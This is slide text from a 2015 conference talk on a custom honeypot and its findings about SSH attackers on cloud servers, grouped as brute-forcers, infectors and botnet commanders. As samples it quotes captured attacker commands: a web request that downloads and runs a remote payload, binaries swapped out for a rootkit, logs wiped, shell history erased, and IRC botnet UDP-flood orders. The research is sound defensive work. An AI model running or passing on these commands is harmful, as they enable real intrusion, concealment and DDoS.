HITB Amsterdam, 28th May 2015. Dr. Pedram Hayati

@SmartHoneypot

Background
Part 1
2

@SmartHoneypot

Pedram (pi3ch) Hayati
· PhD (ComSci), BSc (IT), CREST (CCT) · Sydney, Australia · Security Dimension (SecDim)
· Director and Security Researcher
3

@SmartHoneypot

Traditional security approach
4

@SmartHoneypot

Traditional security approach
1P@ssword · Focus is on making strong perimeter · Harden network services · Closing down unused ports · Requirement of second (multi) factor authentication
· Coming from physical security world
· Constructing a higher wall to stop enemy entering into the castle
· Pitfalls
· Once an attacker is inside there is almost nothing to stop him/her · Bad user experience · Ineffective in certain environments
5

Traditional security approach
Incentivised attackers to use all their efforts to overcome a single high barrier

@SmartHoneypot

1% success

99% failed attempts
6

7

@SmartHoneypot

@SmartHoneypot

Problem statement
The problem (with traditional security approach) is with our view point. · Solve the problem from wrong angle. · Security solutions are based on incorrect or not-real assumption about adversaries
We don't know (enough): · the attackers capabilities · the attackers tactics · The attackers strength and weaknesses
We don't know our enemy · Dragged to a battle · Without understanding the capabilities of our enemy
8

Active defence and protection

@SmartHoneypot

· Identify attack profile
1. Profile

2. Disrupt
· Increase the cost at strategic stages of attack chain

· Preventing the likelihood of a successful compromise
3. Prevent

9

@SmartHoneypot

"Active defence is a security approach that actively increases the cost of performing an attack in terms of time, effort and required resources to the point where a successful compromise against a target is impossible"
10

@SmartHoneypot

Attack chain

Reconn

Weaponisation

Delivery

Exploitation

Installiation

C2

Action

11

@SmartHoneypot

Honeypot system
Part 2
12

@SmartHoneypot

Honeypot system
A decoy system to lure attacker and allow for investigation of their capabilities
13

@SmartHoneypot

Honeypot
To blacklist attackers access to the network To complement an IDS/IPS system To detect malicious insiders To discover internal compromises that have gone undetected To save resources To increase the cost of a successful attack
14

@SmartHoneypot

What is the most fundamental feature of a honeypot system?
15

@SmartHoneypot

Why you should use a custom honeypot
What is the most fundamental feature of a honeypot system? · A decoy system to lure an attacker · Stealthy
"Without this strategic advantage honeypot software is useless. Because attackers know the strategies of honeypot software they are also able to prepare counter" ­ Joseph Corey, Advanced
Honey Pot Identification And Exploitation, Volume 0x0b, Issue 0x3f, Phile #0x09 of 0x0f, Phrack
16

@SmartHoneypot

What is the common problem with a known honeypot software?
17

@SmartHoneypot

Problem
A publically known honeypot system · High likely to be fingerprinted by an adversary · Could miss real intrusions · May capture false-positive
18

@SmartHoneypot

Solution
A honeypot system · Fully customisable · Started from scratch · Undisclosed tactic
19

@SmartHoneypot

That's where my journey started...
20

@SmartHoneypot

Smart Honeypot
A custom honeypot intelligence system
21

@SmartHoneypot

Three key principles
Develop a honeypot system
22

@SmartHoneypot

Principle #1: Do not fake
A honeypot system must look legitimate from eyes of an adversary In the design of a honeypot system, where possible do not · fake network service · Re-implement a network protocol It is difficult to get it right and chances are you will fail implementing all use cases.
23

@SmartHoneypot

Principle #2: Segregation of duties
· A honeypot is a complex system that needs to handle many tasks
· Resemble a real system and interact with attacker · Monitor all the interaction · Executing malware (or malcodes) · Etc.
You are dealing with unkown `misuse cases'. You are creating a system to welcome adversaries. So chances are something goes wrong or misued. So, in design of a honeypot system, manage each task in a separate system, specifically · Interaction · Monitoring · Storage
24

@SmartHoneypot

Principle #3: Smart deployment
It is important where to place a honeypot system: · An unused public IP address
· Hunt external intruders
Other locations · A previously used public IP address
· Attackers will come back
· Internal network
· Suspicious first sight of probes and malicious insiders
· Specific URLs (e.g. Google dork)
Tip: Deploy more than one honeypot in the network. · Great for behavioural analysis and correlation
25

@SmartHoneypot

Experiment
Part 3
26

@SmartHoneypot

Experiment setup
· 13 Smart Honeypot
· AWS, Google Cloud
· Distributed across geographic regions
· America, Europe, Asia and Oceania
· Identical
· Mimicking a typical server · SSH and Web
· IP addresses not published
· No domain mapping
27

@SmartHoneypot

Objectives
1. Identify the SSH attack chain 2.Discover the attack profile for each
geographic region 3.Find the association or relationship
among attackers
28

@SmartHoneypot

Objective 1
Identify the SSH attack chain
29

@SmartHoneypot
Analytic dashboard

30

@SmartHoneypot

Time for the first intrusion?
31

@SmartHoneypot

On average less than 10 minutes
32

@SmartHoneypot

Are they script kiddies?
33

@SmartHoneypot

Three threat actors
34

@SmartHoneypot

Threat actor: Brute-forcer
· Fingerprinting · Wide spread scanning · SSH Brute-force attempts · DNS amplification attacks · Automated
· Seen and picked by most IDS · Most reports are based on
· Blacklists · IDS rules
35

@SmartHoneypot

Examples
Brute-forcer
36

37

@SmartHoneypot

38

@SmartHoneypot

@SmartHoneypot

GET /phpmyadmin/config/config.inc.php?ev al=system('echo cd /tmp;wget http://x.toh.info/.x/f.pdf;perl f.pdf;curl -O http://x.toh.info/.x/f.pdf;perl f.pdf;lwp-download http://x.toh.info/.x/f.pdf;perl f.pdf;fetch http://x.toh.info/.x/f.pdf;perl f.pdf;rm -rf f.pdf*'
39

@SmartHoneypot

zhongxing123 @#$%hackin2inf3ctsiprepe@#$% darkhackerz01 ullaiftw5hack t0talc0ntr0l4!
40

41

@SmartHoneypot

@SmartHoneypot

Threat actor: Infector
· Distribution and execution of malcodes · Run commands for initial compromise · Source from a different IP address · They highly interact with system · They need root/administrator access · Semi automated
· Mostly not listed in any report
42

@SmartHoneypot

Example
Infector
43

@SmartHoneypot

attacker@hp1:>
"free -m",<ret>,"last",<ret>,"cd /var/tmp",<ret>,"chmod 777 httpd.pl",<ret>,"perl httpd.pl",<ret>,"cd",<ret>,"rm -rf .bash_history",<ret>,"history -c && clear",<ret>,"history -c && clear",<ret>
44

@SmartHoneypot

attacker@hp1:> "free m",<ret>,"last",<ret>,"top",<ret>,"rm -rf .bash_history",<ret>,"history -c && clear",<ret>,"history -c && clear",<ret>
45

@SmartHoneypot

attack@217.20.XXX.YYY>> bash "cd /etc",<ret>,"wget http://94.199.XXX.YYY/.../k.tgz; tar zxvf k.tgz ;
rm -rf k.tgz;",<ret>," cd .kde; chmod +x *; ./start.sh; ",<ret>," ./bleah 87.98.XXX.YYY; ./bleah mgx1.magex.hu; ",
<ret>,"/sbin/service crond restart",<ret>,"service crond restart",<ret>,"/etc/init.d/crond restart",<nl>,"w",<nl>,"
historye",<backspace>,<backspace>,<backspace>,<backspace>,<b ackspace>,<backspace>,<backspace>,<backspace>,<backspace>,<b ackspace>,<backspace>,<backspace>,<backspace>,<backspace>,<b ackspace>,<backspace>,<backspace>,<backspace>,<backspace>,<b ackspace>,<backspace>,<backspace>,<backspace>,"oasswd",<ret> ,"passwd",<ret>,"history -c",<ret>,"exit",<ret>
46

@SmartHoneypot

So script kiddies! Hahaha...
47

@SmartHoneypot

09:51:46 root)cp -f /bin/netstat /usr/bin/dpkgd/netstat 09:51:46 root)mkdir -p /bin 09:51:46 root)cp -f /tmp/.bash_root.tmp3 /bin/netstat 09:51:46 root)chmod 0755 /bin/netstat 09:51:46 root)cp -f /bin/ps /usr/bin/dpkgd/ps 09:51:46 root)mkdir -p /bin 09:51:46 root)cp -f /tmp/.bash_root.tmp3 /bin/ps 09:51:46 root)chmod 0755 /bin/ps 09:51:46 root)cp -f /usr/bin/lsof /usr/bin/dpkgd/lsof 09:51:47 root)mkdir -p /usr/bin 09:51:47 root)cp -f /tmp/.bash_root.tmp3 /usr/bin/lsof 09:51:47 root)chmod 0755 /usr/bin/lsof 09:51:47 root)mkdir -p /usr/bin 09:51:47 root)cp -f /tmp/.bash_root.tmp3 /usr/bin/smm
48

@SmartHoneypot

lrwxrwxrwx 1 root root lrwxrwxrwx 1 root root -rw-r--r-- 1 syslog adm drwxr-xr-x 2 root root -rw-r--r-- 1 root adm lrwxrwxrwx 1 root root -rw-r----- 1 syslog adm -rw-r----- 1 syslog adm lrwxrwxrwx 1 root root lrwxrwxrwx 1 root root lrwxrwxrwx 1 root root -rw-r----- 1 syslog adm -rw-r----- 1 syslog adm -rw-r----- 1 syslog adm

9 May 20 12:26 auth.log -> /dev/null 9 May 20 12:26 btmp -> /dev/null 37823 May 13 14:16 cloud-init.log 4096 Oct 10 2012 dist-upgrade 15713 May 13 14:16 dmesg 9 May 20 12:26 lastlog -> /dev/null 0 May 7 12:35 mail.err 0 May 7 12:35 mail.log 9 May 20 09:48 messages -> /dev/null 9 May 20 09:48 secure -> /dev/null 9 May 20 12:26 security -> /dev/null 490 May 21 11:55 syslog 61822 May 21 11:45 syslog.1 2914 May 20 13:46 syslog.2.gz

49

@SmartHoneypot

09:51:48 root)/usr/bin/smm 09:51:48 root)ln -s /etc/init.d/selinux /etc/rc1.d/S99selinux 09:51:48 root)ln -s /etc/init.d/selinux /etc/rc2.d/S99selinux 09:51:48 root)ln -s /etc/init.d/selinux /etc/rc3.d/S99selinux 09:51:48 root)ln -s /etc/init.d/selinux /etc/rc4.d/S99selinux 09:51:48 root)ln -s /etc/init.d/selinux /etc/rc5.d/S99selinux 09:51:48 root)/usr/bin/bsd-port/udevd 09:51:48 root)insmod /usr/lib/xpacket.ko
50

@SmartHoneypot

And We are done!
51

@SmartHoneypot

Threat actor: Commander
· Environment was made ready for Commander to use · C2 opeorators · DDoS, Spam etc · Manual
52

@SmartHoneypot

Examples
Commander
53

@SmartHoneypot

15587443 18:56:15.740190939 0 perl (9105) < clone res=0 exe=usr/sbin/http args= tid=9105(perl) pid=9105(perl) ptid=1(init) cwd=/ fdlimit=1024 flags=0 uid=1001 gid=1001 15587524 18:56:15.941113093 0 perl (9105) < connect res=0 tuple=172.31.20.159:60318>5.254.XXX.YYY:37269
54

@SmartHoneypot

NICK Linux|-|616 USER Linux|-| 172.31.20.159 5.254.XXX.YYY :Linux|PING :5C54B20 PONG :5C54B20 :Google.com 001 Linux|-|616 :Welcome to the Google IRC Network :Google.com 002 Linux|-|616 :Your host is https://www.google.com/ :Google.com 003 Linux|-|616 :Google was created September 4, 1998 :Google.com 004 Linux|-|616 :Menlo Park, California, United States Google Google Google :Google.com 251 Linux|-|616 :Setup incoming connection for remote access :Google.com 253 Linux|-|616 32 :stable connections :Google.com 254 Linux|-|616 42 :channels open
55

@SmartHoneypot

:Google.com 265 Linux|-|616 :Number of incoming connections: 100 / 300 :Google.com 266 Linux|-|616 :Number of outgoing connections: 400 / 700 :Google.com 375 Linux|-|616 :- Google.com Message of the Day :Google.com 455 Linux|-|616 :Your username Linux|-| contained the invalid character(s) || and has been changed to Linux-. Please use only the characters 0-9 a-z A-Z _ - or . in your username. Your username is th$
part before the @ in your email address. :Linux|-|616 MODE Linux|-|616 :+iw :Linux|-|616!~Linux-@ec2-54-186-XXX-YYY.us-west-2.compute.amazonaws.com JOIN :#Support :Google.com 332 Linux|-|616 #Support :welcome to customer support..YRN!!! :Google.com 333 Linux|-|616 #Support Gucci 1400084968 :Google.com 353 Linux|-|616 @ #Support :Linux|-|616 ~God ~Gucci :Google.com 366 Linux|-|616 #Support :End of /NAMES list.
56

@SmartHoneypot

PING :Google.com.. PONG :Google.com. :Gucci!Gucci@34635712.46 PRIVMSG #Support :!bot @udpflood 108.61.XXX.YYY 53 65500 60.. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...... :DDoS|-|509!~DDoS-@192.163.XXX.YYY PRIVMSG #Support :.4[..4@.3UDPDDos..12].12 .12Results.4 8818257 .12Kb in.4 60 .12seconds to.4 108.61.XXX.YYY 53... :Gucci!Gucci@34635712.46 PRIVMSG #Support :!bot @udpflood 24.167.XXX.YYY 53 65500 120..
57

@SmartHoneypot

Objectives 2 & 3
Discover the attack profile for each geographic region Find the association or relationship among attackers
58

@SmartHoneypot

Large volume of data
Difficult to carve or make sense of
59

@SmartHoneypot

Data association rule mining
Three actors behind SSH attack chain · Brute-forcer -> Infector -> Commander · Read more: https://blog.secdim.com/in-depth-analysis-of-ssh-attacks-on-
amazon-ec2/
Filter the data base on the following sequence of events:
1. First actor brute-forces the SSH service 2. First actor correctly guesses the credentials 3. Second actor authenticates to the host using the same credentials 4. Second actor prepares the host by executing some commands 5. Second actor uploads & runs malcodes
60

@SmartHoneypot

Representing data
To make it simpler to investigate
61

Network theory
· Graph
· Nodes (or vertices) · Edges (or links or arcs)
· Represent the problem with graph
· Simplify
· Use to
· Find similarities · Clusters · Relationships
62

A

C

B

@SmartHoneypot

@SmartHoneypot

Observations
Fascinating!
63

@SmartHoneypot

Raw view of network
64

@SmartHoneypot

Math representation
 = (, ) · D: ,   (, ) · V = {Attackers IP address, Smart Honeypots IP address} · A = ,  ,   } = {(1.1.1.1,2.2.2.2),(3.3.3.3,4.4.4.4) ... }

A

H

Attack direction

65

@SmartHoneypot

Assumption

A

A

A

A

H

H

A

A

A

A

66

WRONG! 67

@SmartHoneypot

@SmartHoneypot

#1 Unique attackers per region
68

@SmartHoneypot

6% correlation on source of attack across regions
69

@SmartHoneypot

#1 Unique attackers per region
· Majority of attack are originated from unique sources per each geographic region
· A generic blacklist feed is ineffective
· Intrusion detection (prevention) system · Firewall · SIEM solution
70

@SmartHoneypot

#2 Most targeted Smart Honeypots
71

@SmartHoneypot

#2 Most targeted Smart Honeypots
· Different attack profile per geographic region
· Sao Paulo highest · Frankfurt lowest
· A recent AWS data centre
· IP ranges for Cloud providers are known
· Known IP ranges are targeted more.
72

@SmartHoneypot

Math time!
 = ,  · D: directed graph · V = { Attackers IP addresses } · A = ,  ,   }

A1

A2

Association

73

@SmartHoneypot

#3 Few actors behind most attacks
74

@SmartHoneypot

Math time!
 = ,  · D: directed graph · V = { Attackers IP addresses, ASN } · A = ,  ,   }

A1

A2

Association

ASN ASN
#

75

@SmartHoneypot

#4 Different threat actors are involved
76

@SmartHoneypot

#4 Different threat actors are involved
77

#4 Different threat actors are involved

@SmartHoneypot

Query Foundry
LLC
Quadra Net Inc

Psychz Networks
Hee Thai Limited
WeHost Website
s.com

Input Output Flood LLC
HostSpace Networks
LLC

78

@SmartHoneypot

Two possible scenarios
1. Infector (US) purchased a botnet in Hong Kong to perform a brute-force attempts
2. A list of compromised hosts was traded to the Infector (US) for distribution of malwares
?
79

@SmartHoneypot

Timeline of intrusion

HK
21 Nov

7 days

1 day

BF

IN

US
28 Nov

80

@SmartHoneypot

Wrap up
If there is a mad guy in the town and he goes around and throws bricks to the windows. We can either one, go an buy a bullet proof window or two, as a community we can keep the mad guy out.
Unfortunately, in the it security world, the solution is the earlier.
I am hopping by providing more attack intelligence through active defense approach and honeypot, we respond more effectively to todays security problem.
81

@SmartHoneypot

Any questions?
82

Pedram Hayati
Twitter: pi3ch pedram@secdim.com
Read my blog posts at blog.secdim.com

Smart Honeypot
Twitter: smarthoneypot www.smarthoneypot.com
"Know your enemy prior to building your defence"
83

@SmartHoneypot

